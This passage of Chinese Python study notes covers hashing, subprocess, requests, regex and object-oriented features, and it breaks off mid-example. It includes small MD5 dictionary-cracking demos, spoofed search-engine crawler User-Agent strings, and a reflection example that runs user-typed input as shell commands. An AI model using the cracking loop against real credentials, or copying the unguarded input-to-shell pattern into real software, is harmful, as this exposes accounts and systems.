注意：把一段很长的数据update多次，与一次update这段长数据，得到的结果一样
但是update多次为校验大文件提供了可能。
'''
~~~

###### 尝试撞库攻击

~~~python
import hashlib

crypto_content = '25f9e794323b453885f5181f1b624d0b'

password = [
    '123456',
    '123',
    'admin',
    'admin123456',
    'admin123',
    '888888',
    '88888888',
    '123456789',
    'admin88888'
]

for i in password:
    a = hashlib.md5()
    a.update(i.encode('utf-8'))
    res = a.hexdigest()
    if res == crypto_content:
        print(i + "是原来的值")
---------------------------------------------------
123456789是原来的值
~~~

###### 密码加盐salt

可以通过拼接的方式，把salt放在前，中，后都可以

~~~python
import hashlib

m=hashlib.md5()

m.update('天王'.encode('utf-8'))
m.update('alex3714'.encode('utf-8'))
m.update('盖地虎'.encode('utf-8'))
print(m.hexdigest())
~~~

##### subprocess

~~~python
import subprocess

res = subprocess.Popen('dir',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
#	这里dir是你执行的shell命令，stdout=subprocess.PIPE是当执行成功后把他放在管道里，PIPE,stderr=subprocess.PIPE是执行失败时放在管道里
das = res.stdout.read()	#	让das读出执行成功管道里的值
das_1 = res.stderr.read()  #	让das_1读出执行失败管道里的值
print(das.decode('gbk'))	#	这里gbk代表是windows下的默认编码格式，如果是linux下那么是utf-8
~~~

##### base64

~~~python
# 想将字符串转编码成base64,要先将字符串转换成二进制数据
import base64
url = "https://www.cnblogs.com/songzhixue/"
bytes_url = url.encode("utf-8")
str_url = base64.b64encode(bytes_url)  # 被编码的参数必须是二进制数据
print(bytes_url)

# b'aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8='
-------------------------------------------------------------------------------------------------
# 将base64解码成字符串
import base64
url = "aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8="
str_url = base64.b64decode(url).decode("utf-8")
print(str_url)

# 'https://www.cnblogs.com/songzhixue/'
~~~

对admin888先进行md5加密再进行base64编码得到N2ZlZjYxNzE0NjllODBkMzJjMDU1OWY4OGIzNzcyNDU=

然后再对N2ZlZjYxNzE0NjllODBkMzJjMDU1OWY4OGIzNzcyNDU=进行base64解码，再撞库攻击得到admin888

~~~python
import hashlib
import base64

source = "admin888"
a = hashlib.md5()
a.update(source.encode('utf-8'))
source_1 = a.hexdigest()
source_2 = source_1.encode('utf-8')
source_3 = base64.b64encode(source_2)
print(source_3)

#   N2ZlZjYxNzE0NjllODBkMzJjMDU1OWY4OGIzNzcyNDU=
~~~



~~~python
import hashlib
import base64

source = "N2ZlZjYxNzE0NjllODBkMzJjMDU1OWY4OGIzNzcyNDU="

source_1 = source.encode('utf-8')

source_2 = base64.b64decode(source_1)
source_3 = source_2.decode('utf-8')

# print(source_3,type(source_3))
dict_1 = [
'admin',
'123456',
'8888888',
'a123456',
'888888',
'batmanfuture',
'12345678',
'654321',
'system',
'admin888',         #   对admin888先进行md5-->7fef6171469e80d32c0559f88b377245
'superman'                                  #7fef6171469e80d32c0559f88b377245
]
for i in dict_1:
    a = hashlib.md5()
    a.update(i.encode('utf-8'))
    b = a.hexdigest()

    b = str(b)
    if b in source_3:
        print("找到明文密码了,密码是" + i)
~~~

##### requests

###### 几种爬虫引擎的主机头

~~~python
#	百度
Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
#	谷歌
Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
#	搜狗
Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)
#	360
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider
~~~

###### 模块介绍

[![bwsTGq.png](https://s4.ax1x.com/2022/03/05/bwsTGq.png)](https://imgtu.com/i/bwsTGq)

~~~python
url="你想获取的网址"
r=requests.get(url)
#也可以使用r=requests.get("你想要获取的网址")
#现在我们有一个名叫r的Response对象。我们可以从这个对象中来获取我们想要的信息
#(可选)是可要可不要的意思
#下面的url params **kwards data json的意思
#url:网址
#param:参数(可选)字典，要在请求的查询字符串中发送的元组或字节的列表。
#**kwards:采用可选参数
#data:（可选） 字典、要在请求的正文中发送的元组、字节或文件类对象的列表。
#json:（可选） json 数据发送到请求的正文。
#requests.get(url, params=None, **kwargs)GET请求
#requests.post(url, data=None, json=None, **kwargs) POST请求
#requests.put(url, data=None, **kwargs) PUT请求
#requests.delete(url, **kwargs) DELETE请求
#requests.head(url, **kwargs)HEAD请求
#requests.options()OPTIONS请求
#requests.patch(url, data=None, **kwargs)PATCH请求
#都是获取网址然后使我们从中获取我们想要的信息
~~~

###### session()维持会话

~~~python
import requests

s = requests.Session()
# 第一步：发送一个请求，用于设置请求中的cookies
# tips: http://httpbin.org能够用于测试http请求和响应
s.get('http://httpbin.org/cookies/set/sessioncookie/123456789')
# 第二步：再发送一个请求，用于查看当前请求中的cookies
r = s.get("http://httpbin.org/cookies")
print(r.text)
~~~

~~~python
#requests.session():维持会话,可以让我们在跨请求时保存某些参数
import requests
#实例化session
session = requests.session()
#目标url
url = 'https://www.douban.com/accounts/login'
form_data = {
    'source': 'index_nav',
    'form_email': 'xxx',
    'form_password': 'xxx',
    'captcha-solution': 'stamp',
    'captcha-id': 'b3dssX515MsmNaklBX8uh5Ab:en'
}
#设置请求头
req_header = {
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
}
#使用session发起请求
response = session.post(url,headers=req_header,data=form_data)
if response.status_code == 200:
    #访问个人主页：
    url = 'https://www.douban.com/people/175417123/'
    response = session.get(url,headers = req_header)
    if response.status_code == 200:
        with open('douban3.html','w') as file:
            file.write(response.text)
~~~





##### re

[![bwjnts.png](https://s4.ax1x.com/2022/03/05/bwjnts.png)](https://imgtu.com/i/bwjnts)

~~~python
import re

# findall:  匹配字符串中所有的符合正则的内容
lst = re.findall(r"\d+", "我的电话号是:10086, 我女朋友的电话是:10010")
print(lst)

# finditer: 匹配字符串中所有的内容[返回的是迭代器], 从迭代器中拿到内容需要.group()
it = re.finditer(r"\d+", "我的电话号是:10086, 我女朋友的电话是:10010")
for i in it:
    print(i.group())

# search, 找到一个结果就返回, 返回的结果是match对象. 拿数据需要.group()
s = re.search(r"\d+", "我的电话号是:10086, 我女朋友的电话是:10010")
print(s.group())


# match是从头开始匹配
s = re.match(r"\d+", "10086, 我女朋友的电话是:10010")
print(s.group())

# 预加载正则表达式
obj = re.compile(r"\d+")

ret = obj.finditer("我的电话号是:10086, 我女朋友的电话是:10010")
for it in ret:
    print(it.group())

ret = obj.findall("呵呵哒, 我就不信你不换我1000000000")
print(ret)

s = """
<div class='jay'><span id='1'>郭麒麟</span></div>
<div class='jj'><span id='2'>宋铁</span></div>
<div class='jolin'><span id='3'>大聪明</span></div>
<div class='sylar'><span id='4'>范思哲</span></div>
<div class='tory'><span id='5'>胡说八道</span></div>
"""

# (?P<分组名字>正则) 可以单独从正则匹配的内容中进一步提取内容
obj = re.compile(r"<div class='.*?'><span id='(?P<id>\d+)'>(?P<wahaha>.*?)</span></div>", re.S)  # re.S: 让.能匹配换行符

result = obj.finditer(s)
for it in result:
    print(it.group("wahaha"))
    print(it.group("id"))
~~~





#### 类和对象

[![bBt4c4.png](https://s1.ax1x.com/2022/03/06/bBt4c4.png)](https://imgtu.com/i/bBt4c4)

[![bBtTBR.png](https://s1.ax1x.com/2022/03/06/bBtTBR.png)](https://imgtu.com/i/bBtTBR)

~~~python
# 类是对象相似数据与功能的集合体
# 所以类体中最常见的是变量与函数的定义，但是类体其实是可以包含任意其他代码的
# 注意：类体代码是在类定义阶段就会立即执行，会产生类的名称空间
~~~



[![bBNF4f.png](https://s1.ax1x.com/2022/03/06/bBNF4f.png)](https://imgtu.com/i/bBNF4f)

~~~python
class Student:
    # 1、变量的定义
    stu_school='oldboy'

    # 2、功能的定义
    def tell_stu_info(stu_obj):
        print('学生信息：名字：%s 年龄：%s 性别：%s' %(
            stu_obj['stu_name'],
            stu_obj['stu_age'],
            stu_obj['stu_gender']
        ))

    def set_info(stu_obj,x,y,z):
        stu_obj['stu_name']=x
        stu_obj['stu_age']=y
        stu_obj['stu_gender']=z
        
# 属性访问的语法
# 1、访问数据属性
# print(Student.stu_school) # Student.__dict__['stu_school']
# 2、访问函数属性
# print(Student.set_info) # Student.__dict__['set_info']

stu1_obj = Student()

stu1_obj.__dict__['stu_name'] = 'batmanfuture'
stu1_obj.__dict__['stu_age'] = '20'
stu1_obj.__dict__['stu_gender'] = 'male'

print(stu1_obj.__dict__)
#   ----------------------------
stu1_obj.stu_name = 'batmanfuture'
stu1_obj.stu_age = '20'
stu1_obj.stu_gender = 'male'
print(stu1_obj.__dict__)
~~~



~~~python
def init(obj,x,y,z):
    obj.stu_name = x
    obj.stu_age = y
    obj.stu_gender = z

init(stu1_obj,'batmanfuture',20,'male')
print(stu1_obj.__dict__)
~~~

~~~python
#	当我们调用过程时，会产生实例化，类里面 
def __init__(obj,x,y,z):
    obj.stu_name = x
    obj.stu_age = y
    obj.stu_gender = z
    
stu1_obj = Student("batmanfuture",20,'male')

#	调用类的过程又称之为实例化，发生了三件事
# 1、先产生一个空对象
# 2、python会自动调用类中的__init__方法然将空对象已经调用类时括号内传入的参数一同传给__init__方法
# 3、返回初始完的对象

stu1_obj = Student("batmanfuture",20,'male') #	也就是说我们不必传入obj，调用时对方会自动把obj = stu1_obj，同理我们通常把这里的obj改成self
def __init__(self,x,y,z):
    self.stu_name = x
    self.stu_age = y
    self.stu_gender = z

# 总结__init__方法
# 1、会在调用类时自动触发执行，用来为对象初始化自己独有的数据
# 2、__init__内应该存放是为对象初始化属性的功能，但是是可以存放任意其他代码，想要在
#    类调用时就立刻执行的代码都可以放到该方法内
# 3、__init__方法必须返回None
~~~

##### 类的属性以及绑定方法

~~~python
类的数据属性是共享给所有对象用的，大家访问的地址都一样
类中定义的函数主要是给对象使用的，而且是绑定给对象的，虽然所有对象指向的都是相同的功能，但是绑定到不同的对象就是不同的绑定方法，内存地址各不相同
~~~

~~~python
"""
@作者: egon老湿
@微信:18611453110
@专栏: https://zhuanlan.zhihu.com/c_1189883314197168128
"""


# 整合->解耦合->扩展性增强

class School:
    school_name = 'OLDBOY'

    def __init__(self, nickname, addr):
        self.nickname = nickname
        self.addr = addr
        self.classes = []

    def related_class(self, class_obj):
        # self.classes.append(班级名字)
        # self.classes.append(class_name)
        self.classes.append(class_obj)

    def tell_class(self): # 改
        # 打印的班级的名字
        print(self.nickname.center(60,'='))
        # 打印班级开设的课程信息
        for class_obj in self.classes:
            class_obj.tell_course()


# # 一：学校
# #1、创建校区
school_obj1=School('老男孩魔都校区','上海')
school_obj2=School('老男孩帝都校区','北京')
#
# #2、为学校开设班级
# # 上海校区开了:脱产14期，上海校区开了脱产15期
# school_obj1.related_class("脱产14期")
# school_obj1.related_class("脱产15期")
#
# # 北京校区开了:脱产29期
# school_obj2.related_class("脱产29期")
#
# #3、查看每个校区开设的班级
# school_obj1.tell_class()
# school_obj2.tell_class()


class Class:
    def __init__(self, name):
        self.name = name
        self.course = None

    def related_course(self, course_obj):
        # self.course = course_name
        self.course = course_obj

    def tell_course(self):
        print('%s' % self.name,end=" ")
        self.course.tell_info() # 打印课程的详细信息

# 二：班级
# 1、创建班级
class_obj1 = Class('脱产14期')
class_obj2 = Class('脱产15期')
class_obj3 = Class('脱产29期')

# 2、为班级关联一个课程
# class_obj1.related_course('python全栈开发')
# class_obj2.related_course('linux运维')
# class_obj3.related_course('python全栈开发')

# 3、查看班级开设的课程信息
# class_obj1.tell_course()
# class_obj2.tell_course()
# class_obj3.tell_course()

# 4、为学校开设班级
# 上海校区开了:脱产14期，上海校区开了脱产15期
school_obj1.related_class(class_obj1)
school_obj1.related_class(class_obj2)

# 北京校区开了:脱产29期
school_obj2.related_class(class_obj3)


# school_obj1.tell_class()
# school_obj2.tell_class()



class Course:
    def __init__(self,name,period,price):
        self.name=name
        self.period=period
        self.price=price

    def tell_info(self):
        print('<课程名:%s 周期:%s 价钱:%s>' %(self.name,self.period,self.price))
# 三：课程
# 1、创建课程
course_obj1=Course('python全栈开发','6mons',20000)
course_obj2=Course('linux运维','5mons',18000)

# 2、查看课程的详细信息
# course_obj1.tell_info()
# course_obj2.tell_info()

# 3、为班级关联课程对象
class_obj1.related_course(course_obj1)
class_obj2.related_course(course_obj2)
class_obj3.related_course(course_obj1)

# class_obj1.tell_course()
# class_obj2.tell_course()
# class_obj3.tell_course()

school_obj1.tell_class()
school_obj2.tell_class()


class Student:
    pass
~~~

#### 封装

~~~python
# 封装是面向对象三大特性最核心的一个特性
# 封装<->整合

# 1、如何隐藏：在属性名前加__前缀,就会实现一个对外隐藏属性效果
~~~

##### 隐藏属性

~~~python
class Foo: 
  	__x = 1  # _Foo__x
    def __f1(self):  # _Foo__f1
        print('from test')
~~~

~~~python
# I:在类外部无法直接访问双下滑线开头的属性，但知道了类名和属性名就可以拼出名字：_类名__属性，然后就可以访问了，如Foo._A__N，
# 所以说这种操作并没有严格意义上地限制外部访问，仅仅只是一种语法意义上的变形
~~~



~~~python
II：这种隐藏对外不对内,因为__开头的属性会在检查类体代码语法时统一发生变形

class Foo:
    __x = 1  # _Foo__x = 1

    def __f1(self):  # _Foo__f1
        print('from test')

    def f2(self):
        print(self.__x) # print(self._Foo__x)
        print(self.__f1) # print(self._Foo__f1)

print(Foo.__x)
print(Foo.__f1)
obj=Foo()
obj.f2()
~~~



~~~python
# III: 这种变形操作只在检查类体语法的时候发生一次，之后定义的__开头的属性都不会变形
class Foo:
    __x = 1  # _Foo__x = 1

    def __f1(self):  # _Foo__f1
        print('from test')

    def f2(self):
        print(self.__x) # print(self._Foo__x)
        print(self.__f1) # print(self._Foo__f1)

Foo.__y=3
print(Foo.__dict__)
print(Foo.__y)
~~~



~~~python
# 2、为何要隐藏？
# I、隐藏数据属性"将数据隐藏起来就限制了类外部对数据的直接操作，然后类内应该提供相应的接口来允许类外部间接地操作数据，接口之上可以附加额外的逻辑来对数据的操作进行严格地控制：
~~~

##### property

~~~python
# 装饰器是在不修改被装饰对象源代码以及调用方式的前提下为被装饰对象添加
# 新功能的可调用对象
# print(property)

# property是一个装饰器，是用来绑定给对象的方法伪造成一个数据属性

class People:
    def __init__(self, name, weight, height):
        self.name = name
        self.weight = weight
        self.height = height

    # 定义函数的原因1：
    # 1、从bmi的公式上看，bmi应该是触发功能计算得到的
    # 2、bmi是随着身高、体重的变化而动态变化的，不是一个固定的值
    #    说白了，每次都是需要临时计算得到的

    # 但是bmi听起来更像是一个数据属性，而非功能
    @property
    def bmi(self):
        return self.weight / (self.height ** 2)
~~~

~~~python
~~~



#### 继承

~~~python
# 1、什么是继承
# I:继承是一种创建新类的方式，新建的类可称为子类或派生类，父类又可称为基类或超类,子类会遗传父类的属性
# II:需要注意的是：python支持多继承
#          在Python中，新建的类可以继承一个或多个父类

class Parent1(object):
    x=1111

class Parent2(object):
    pass

class Sub1(Parent1): # 单继承
    pass

class Sub2(Parent1,Parent2): # 多继承
    pass

print(Sub1.__bases__)
print(Sub2.__bases__)

print(Sub1.x)
~~~

##### 新式类和经典类

~~~python
# ps1: 在python2中有经典类与新式类之分
# 新式类：继承了object类的子类，以及该子类的子类子子类。。。
# 经典类：没有继承object类的子类，以及该子类的子类子子类。。。

# ps2:在python3中没有继承任何类，那么会默认继承object类，所以python3中所有的类都是新式类
# print(Parent1.__bases__)
# print(Parent2.__bases__)

# III:python的多继承
#     优点：子类可以同时遗传多个父类的属性，最大限度地重用代码
#     缺点：
#         1、违背人的思维习惯：继承表达的是一种什么"是"什么的关系
#         2、代码可读性会变差
#         3、不建议使用多继承，有可能会引发可恶的菱形问题，扩展性变差，
#         如果真的涉及到一个子类不可避免地要重用多个父类的属性，应该使用Mixins

# 2、为何要用继承：用来解决类与类之间代码冗余问题

# 3、如何实现继承
# # 示范1：类与类之间存在冗余问题

class OldboyPeople:
    school = 'OLDBOY'

    def __init__(self, name, age, sex):
        self.name = name
        self.age = age
        self.sex = sex


class Student(OldboyPeople):
    def choose_course(self):
        print('学生%s 正在选课' % self.name)
# stu_obj = Student('lili', 18, 'female')
# print(stu_obj.__dict__)
# print(stu_obj.school)
# stu_obj.choose_course()


class Teacher(OldboyPeople):
    #           老师的空对象，'egon',18,'male',3000,10
    def __init__(self, name, age, sex, salary, level):
        # 指名道姓地跟父类OldboyPeople去要__init__
        OldboyPeople.__init__(self,name,age, sex)
        self.salary = salary
        self.level = level

    def score(self):
        print('老师 %s 正在给学生打分' % self.name)

tea_obj=Teacher('egon',18,'male',3000,10)
# print(tea_obj.__dict__)
# print(tea_obj.school)

tea_obj.score()
~~~

[![bR8qIJ.png](https://s1.ax1x.com/2022/03/09/bR8qIJ.png)](https://imgtu.com/i/bR8qIJ)

##### 单继承背景下的属性查找

~~~python
class Foo:
    def f1(self):
        print('Foo.f1')

    def f2(self):
        print('Foo.f2')
        self.f1() # obj.f1()

class Bar(Foo):
    def f1(self):
        print('Bar.f1')

obj=Bar()
obj.f2()
---------------------------------------
class Foo:
    def f1(self):
        print('Foo.f1')

    def f2(self):
        print('Foo.f2')
        Foo.f1(self) # 调用当前类中的f1

class Bar(Foo):
    def f1(self):
        print('Bar.f1')

obj=Bar()
obj.f2()
-----------------------------------------
class Foo:
    def __f1(self): # _Foo__f1
        print('Foo.f1')

    def f2(self):
        print('Foo.f2')
        self.__f1() # self._Foo__f1,# 调用当前类中的f1

class Bar(Foo):
    def __f1(self): # _Bar__f1
        print('Bar.f1')

obj=Bar()
obj.f2()
~~~



#### 菱形问题-MRO

[![p9MLOfA.png](https://s1.ax1x.com/2023/04/27/p9MLOfA.png)](https://imgse.com/i/p9MLOfA)

对于你定义的每一个类，Python都会计算出一个方法解析顺序(MRO)列表，该MRO列表就是一个简单的所有基类的线性顺序列表，如下

~~~python
>>> D.mro() # 新式类内置了mro方法可以查看线性列表的内容，经典类没有该内置该方法
[<class '__main__.D'>, <class '__main__.B'>, <class '__main__.C'>, <class '__main__.A'>, <class 'object'>]
~~~

python会在MRO列表上从左到右开始查找基类,直到找到第一个匹配这个属性的类为止。 而这个MRO列表的构造是通过一个C3线性化算法来实现的。我们不去深究这个算法的数学原理,它实际上就是合并所有父类的MRO列表并遵循如下三条准则

~~~python
1.子类会先于父类被检查
2.多个父类会根据它们在列表中的顺序被检查
3.如果对下一个类存在两个合法的选择,选择第一个父类
~~~

~~~python
class A(object):
    # def test(self):
    #     print('from A')
    pass

class B(A):
    def test(self):
        print('from B')
    pass

class C(A):
    # def test(self):
    #     print('from C')
    pass

class D(C,B):
    # def test(self):
    #     print('from D')
    pass

print(D.mro()) # 类D以及类D的对象访问属性都是参照该类的mro列表

# print(C.mro()) # 类C以及类C的对象访问属性都是参照该类的mro列表
# c=C()
# c.test()

# 总结：类相关的属性查找（类名.属性，该类的对象.属性），都是参照该类的mro

# 二：如果多继承是非菱形继承，经典类与新式的属性查找顺序一样：
#    都是一个分支一个分支地找下去，然后最后找object

class E:
    # def test(self):
    #     print('from E')
    pass

class F:
    def test(self):
        print('from F')


class B(E):
    # def test(self):
    #     print('from B')
    pass

class C(F):
    # def test(self):
    #     print('from C')
    pass

class D:
    def test(self):
        print('from D')


class A(B, C, D):
    # def test(self):
    #     print('from A')
    pass

# 新式类
# print(A.mro()) # A->B->E->C->F->D->object

obj = A()
obj.test() # 结果为：from F
~~~

如果继承关系为菱形结构，那么经典类与新式类会有不同MRO，分别对应属性的两种查找方式：深度优先和广度优先

[![bfrz90.png](https://s1.ax1x.com/2022/03/10/bfrz90.png)](https://imgtu.com/i/bfrz90)

~~~python
# 三：如果多继承是菱形继承，经典类与新式类的属性查找顺序不一样：
#    经典类：深度优先，会在检索第一条分支的时候就直接一条道走到黑，即会检索大脑袋（共同的父类）
#    新式类：广度优先，会在检索最后一条分支的时候检索大脑袋

class G: # 在python2中，未继承object的类及其子类，都是经典类
    # def test(self):
    #     print('from G')
    pass

class E(G):
    # def test(self):
    #     print('from E')
    pass

class F(G):
    def test(self):
        print('from F')

class B(E):
    # def test(self):
    #     print('from B')
    pass

class C(F):
    def test(self):
        print('from C')

class D(G):
    def test(self):
        print('from D')

class A(B,C,D):
    # def test(self):
    #     print('from A')
    pass

# 新式类
# print(A.mro()) # A->B->E->C->F->D->G->object

# 经典类：A->B->E->G->C->F->D
obj = A()
obj.test() #

经典类没有object这一个东西
~~~

#### Mixins机制

```
就是在多继承背景下尽可能地提升多继承的可读性
```

~~~python
class Vehicle:
    pass

class FlyableMixin:
    def fly(self):
        pass

class CivilAircraft(FlyableMixin,Vehicle):  # 民航飞机
    pass

class Helicopter(FlyableMixin,Vehicle):  # 直升飞机
    pass

class Car(Vehicle):  # 汽车并不会飞，但按照上述继承关系，汽车也能飞了
    pass


import socketserver
# 补充：通常Mixin结果的类放在左边
~~~







##### 在子类派生的新方法中重用父类功能

~~~python
# 在子类派生的新方法中如何重用父类的功能
# 方式一：指名道姓调用某一个类下的函数=》不依赖于继承关系
class OldboyPeople:
    def __init__(self,name,age,sex):
        self.name=name
        self.age=age
        self.sex=sex

    def f1(self):
        print('%s say hello' %self.name)


class Teacher(OldboyPeople):
    def __init__(self,name,age,sex,level,salary):
        OldboyPeople.__init__(self,name,age,sex)

        self.level = level
        self.salary=salary

tea_obj=Teacher('egon',18,'male',10,3000)
print(tea_obj.__dict__)

# 方式二：super()调用父类提供给自己的方法=》严格依赖继承关系
# 调用super()会得到一个特殊的对象，该对象会参照发起属性查找的那个类的mro,去当前类的父类中找属性
class OldboyPeople:
    def __init__(self,name,age,sex):
        self.name=name
        self.age=age
        self.sex=sex

    def f1(self):
        print('%s say hello' %self.name)


class Teacher(OldboyPeople):
    def __init__(self,name,age,sex,level,salary):
        # super(Teacher,self).__init__(name,age,sex)
        super().__init__(name,age,sex) # 调用的是方法，自动传入对象

        self.level = level
        self.salary=salary

# print(Teacher.mro())
tea_obj=Teacher('egon',18,'male',10,3000)
print(tea_obj.__dict__)
~~~

~~~python
class A:
    def test(self):
        print('from A')
        super().test1()

class B:
    def test(self):
        print('from B')

class C(A,B):
    def test1(self):
        print('from C')

obj=C()
obj.test()

print(C.mro())
~~~

##### 多态

~~~python
# 1、什么多态：同一事物有多种形态
class Animal:
    pass

class People(Animal):
    pass

class Dog(Animal):
    pass

class Pig(Animal):
    pass

# 2、为何要有多态=》多态会带来什么样的特性，多态性
#    多态性指的是可以在不考虑对象具体类型的情况下而直接使用对象

print('hello'.__len__())
print([1,2,3].__len__())
print({'a':1,'b':2}.__len__())

def my_len(val):
    return val.__len__()

print(my_len('hello'))
print(my_len([1,2,3]))
print(my_len({'a':1,'b':2}))
~~~

###### 鸭子类型

~~~python
class Cpu:
    def read(self):
        print('cpu read')

    def write(self):
        print('cpu write')

class Mem:
    def read(self):
        print('mem read')

    def write(self):
        print('mem write')


class Txt:
    def read(self):
        print('txt read')

    def write(self):
        print('txt write')


obj1=Cpu()
obj2=Mem()
obj3=Txt()

obj1.read()
obj1.write()

obj2.read()
obj2.write()

obj3.read()
obj3.write()
~~~

##### 绑定方法与非绑定方法

@classmethod和@staticmethod

~~~python
# 一：绑定方法：特殊之处在于将调用者本身当做第一个参数自动传入
#    1、绑定给对象的方法：调用者是对象，自动传入的是对象
#    2、绑定给类的方法：调用者类，自动传入的是类

import settings

class Mysql:
    def __init__(self,ip,port):
        self.ip=ip
        self.port=port

    def func(self):
        print('%s:%s' %(self.ip,self.port))

    @classmethod # 将下面的函数装饰成绑定给类的方法
    def from_conf(cls):
        print(cls)
        return cls(settings.IP, settings.PORT)

# obj1=Mysql('1.1.1.1',3306)

obj2=Mysql.from_conf()
print(obj2.__dict__)

# 二：非绑定方法-》静态方法：
#    没有绑定给任何人：调用者可以是类、对象，没有自动传参的效果

class Mysql:
    def __init__(self,ip,port):
        self.nid=self.create_id()
        self.ip=ip
        self.port=port

    @staticmethod # 将下述函数装饰成一个静态方法
    def create_id():
        import uuid
        return uuid.uuid4()

    @classmethod
    def f1(cls):
        pass

    def f2(self):
        pass
obj1=Mysql('1.1.1.1',3306)

print(Mysql.create_id)
print(Mysql.f1)
print(obj1.f2)
~~~



##### 内置函数

~~~python
#	取绝对值
print(abs(-1))
#	所有的值取出来做布尔运算，所有的值都为true结果才为true		如果可迭代对象为空返回true
print(all([1,'aaa','1']))										print(all([]))
#	所有的值取出来做布尔运算，所有的值都为false结果才为false	如果可迭代对象为空返回false
print(any([0,None,1]))											print(any([]))
#	进制转换：bin是二进制，oct是八进制，hex是十六进制
print(bin(11))
print(oct(11))
print(hex(11))
#	用来判断某一个对象，或者类，或者函数是否可以被调用
print(callable(Foo)) 
#	ord把字符转ascii数字，chr是ascii码转字符
print(chr(65))
print(ord('A'))
#	dir()	查看对应的下面有哪些属性
class Foo:
  pass
obj = Foo()
print(dir(obj))
#	divmod可以算出商和余数
print(divmod(10,3))
#	enumerate既拿到索引，也拿到值
for i,v in enumerate(['a','b','c']):
    print(i,v)
#	执行字符串中的表达式
res=eval('{"a":1}') 
print(res,type(res))
# 不可变集合
s=frozenset({1,2,3})
# 类型判断推荐使用isinstance
print(isinstance([],list)) 
#	10的平方再对3取余数
print(pow(10,2,3))
#	slice切片
s=slice(1,4,2)
l1=['a','b','c','d','e']
l2=['aaa','bbb','ccc','ddd',444]

print(l1[1:4:2]) # l1[s]
print(l2[1:4:2]) # l2[s]

#	zip
v1='hello'
v2=[111,222,333,444,5555,6666]
res=zip(v1,v2)
print(list(res))

#	__import__('time')字符串模块导入
# import 'time' # 错误
time=__import__('time')
time.sleep(3)
~~~

##### 反射机制

```python
# 什么是反射？
# 指的是在程序运行过程中可以"动态（不见棺材不掉泪）"获取对象的信息

class People:
    def __init__(self,name,age):
        self.name=name
        self.age=age

    def say(self):
        print('<%s:%s>' %(self.name,self.age))

obj=People('辣白菜同学',18)

# 实现反射机制的步骤
# 1、先通过多dir：查看出某一个对象下可以.出哪些属性来
# print(dir(obj))

# 2、可以通过字符串反射到真正的属性上，得到属性值
# print(obj.__dict__[dir(obj)[-2]])

# 1、hasattr()
print(hasattr(obj,'name'))
print(hasattr(obj,'x'))

# 2、getattr()
print(getattr(obj,'name'))

# 3、setattr()
setattr(obj,'name','EGON') # obj.name='EGON'
print(obj.name)

# 4、delattr()
delattr(obj,'name') # del obj.name
print(obj.__dict__)
```

~~~python
import subprocess

class Ftp:
    def put(self, shell):
        print('正在执行上传功能')
        subprocess.run(shell.split(), check=True)

    def get(self, shell):
        print('正在执行下载功能')
        self.put(shell)  # 调用put方法，并将shell作为参数传递

    def interactive(self):
        input_str = input(">>>: ").strip()
        input_list = input_str.split()
        method = input_list[0]
        shell = ' '.join(input_list[1:])  # 将除第一个元素外的其它元素拼接成字符串作为参数

        if hasattr(self, method):
            getattr(self, method)(shell)
        else:
            print('输入的指令不存在')


obj = Ftp()
obj.interactive()
~~~





##### 内置方法

~~~python
# 1、什么是内置方法？
# 定义在类内部，以__开头并以__结果的方法
# 特点：会在某种情况下自动触发执行

# 2、为何要用内置方法？
# 为了定制化我们的类or对象

# 3、如何使用内置方法
# __str__:在打印对象时会自动触发，然后将返回值（必须是字符串类型）当做本次打印的结果输
class People:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def __str__(self):
        # print('运行了...')
        return "<%s:%s>" %(self.name,self.age)


obj = People('辣白菜同学', 18)

# print(obj.__str__())
print(obj)  # <'辣白菜同学':18>

obj1=int(10)
print(obj1)

# __del__：在清理对象时触发，会先执行该方法
class People:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        self.x = open('a.txt',mode='w')
        # self.x = 占据的是操作系统资源

    def __del__(self):
        # print('run...')
        # 发起系统调用，告诉操作系统回收相关的系统资源
        self.x.close()

obj = People('辣白菜同学', 18)
# del obj # obj.__del__()
print('============>')
~~~

##### 元类

一切皆为对象

~~~python
# 元类就是用来实例化产生类的类，把People看成对象，那么它的类就是Class
# 关系：元类---实例化---->类（People）---实例化---->对象（obj）

class People:
    def __init__(self,name,age):
        self.name=name
        self.age=age

    def say(self):
        print('%s:%s' %(self.name,self.name))

obj = People('batmanfuture','123456')
print(type(obj))
print(type(People))
~~~



##### class机制分析

~~~python
类有三大特征：
# 1、类名
class_name="People"
# 2、类的基类
class_bases=(object,)
# 3、执行类体代码拿到类的名称空间
class_dic={}
class_body="""
def __init__(self,name,age):
    self.name=name
    self.age=age

def say(self):
    print('%s:%s' %(self.name,self.name))
"""
exec(class_body,{},class_dic)
People=type(class_name,class_bases,class_dic)

~~~

#### 定制元类控制类的产生

~~~python
class Mymeta(type): # 只有继承了type类的类才是元类
    def __call__(self, *args, **kwargs):
        # 1、Mymeta.__call__函数内会先调用People内的__new__
        people_obj=self.__new__(self)
        # 2、Mymeta.__call__函数内会调用People内的__init__
        self.__init__(people_obj,*args, **kwargs)

        # print('people对象的属性：',people_obj.__dict__)
        people_obj.__dict__['xxxxx']=11111
        # 3、Mymeta.__call__函数内会返回一个初始化好的对象
        return people_obj

class People(metaclass=Mymeta):
    def __init__(self,name,age):
        self.name=name
        self.age=age

    def say(self):
        print('%s:%s' %(self.name,self.name))

    def __new__(cls, *args, **kwargs):
        # 产生真正的对象
        return object.__new__(cls)

obj1=People('egon', 18)
obj2=People('egon', 18)
# print(obj)
print(obj1.__dict__)
print(obj2.__dict__)
~~~

__call__方法

~~~python
class CLanguage:
    # 定义__call__方法
    def __call__(self,name,add):
        print("调用__call__()方法",name,add)

clangs = CLanguage()
